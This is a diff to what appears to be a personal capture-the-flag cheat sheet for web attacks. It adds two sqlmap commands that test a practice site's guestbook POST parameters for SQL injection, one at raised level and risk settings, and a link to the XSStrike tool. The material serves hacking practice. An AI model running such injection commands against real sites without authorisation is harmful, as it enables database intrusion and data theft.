@@ -45,3 +45,12 @@
 
 ## web
   - SSRF
+
+### sqlmap
+  ```
+  sqlmap -u "https://hackme.inndy.tw/gb/?mod=post" --method POST -p "content,title" --data "title=a&content=b"  
+  sqlmap -u "https://hackme.inndy.tw/gb/?mod=post" --method POST -p "content,title" --data "title=a&content=b" --level=3 --risk=3 # if above not working
+  ```
+
+### XSStrike
+  - [XSStrike](https://github.com/s0md3v/XSStrike)
